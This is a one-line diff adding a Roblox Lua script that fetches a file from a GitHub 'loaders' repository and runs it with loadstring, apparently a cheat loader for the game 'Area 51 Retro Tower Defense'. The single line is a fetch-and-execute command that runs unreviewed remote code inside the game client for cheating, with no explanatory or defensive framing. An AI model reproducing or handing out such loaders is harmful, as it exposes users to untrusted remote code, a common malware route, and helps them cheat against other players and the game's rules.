@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/area-51-retro-tower-defense-spam3-rbo1t5hno772a2.lua"))()
